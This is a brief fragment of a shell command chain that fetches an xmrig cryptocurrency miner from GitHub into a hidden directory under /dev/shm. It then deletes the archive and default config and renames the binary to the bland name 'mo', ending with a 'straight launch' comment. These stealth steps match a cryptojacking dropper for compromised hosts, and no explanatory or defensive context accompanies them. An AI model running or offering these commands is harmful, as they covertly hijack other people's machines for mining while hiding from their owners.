...
mkdir /dev/shm/.f && wget -O /dev/shm/.f/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/.f/xmrig.tar.gz -C /dev/shm/.f/ && rm -f /dev/shm/.f/xmrig.tar.gz && rm /dev/shm/.f/config.json && mv /dev/shm/.f/xmrig /dev/shm/.f/mo
# straight launch
